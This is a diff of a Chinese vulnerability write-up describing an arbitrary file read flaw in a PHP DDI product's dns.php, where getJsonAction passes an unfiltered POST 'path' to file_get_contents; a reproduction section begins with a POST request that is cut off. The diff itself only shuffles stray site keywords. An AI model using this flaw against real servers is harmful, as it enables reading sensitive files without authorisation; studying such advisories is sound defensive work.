@@ -20,14 +20,6 @@ asset_dir: embedded-base64
 
 直接看 `ddi/server/dns.php` 中的 `getJsonAction` 方法实现
 
-深入探索
-
-数据管理
-
-软件
-
-内容管理系统
-
 ```
 public function getJsonAction() {
         $file = p('path');
@@ -41,6 +33,14 @@ public function getJsonAction() {
 直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
+
+深入探索
+
+软件
+
+数据管理
+
+VPN
 
 ```
 POST /ddi/server/dns.php?a=getJson HTTP/1.1
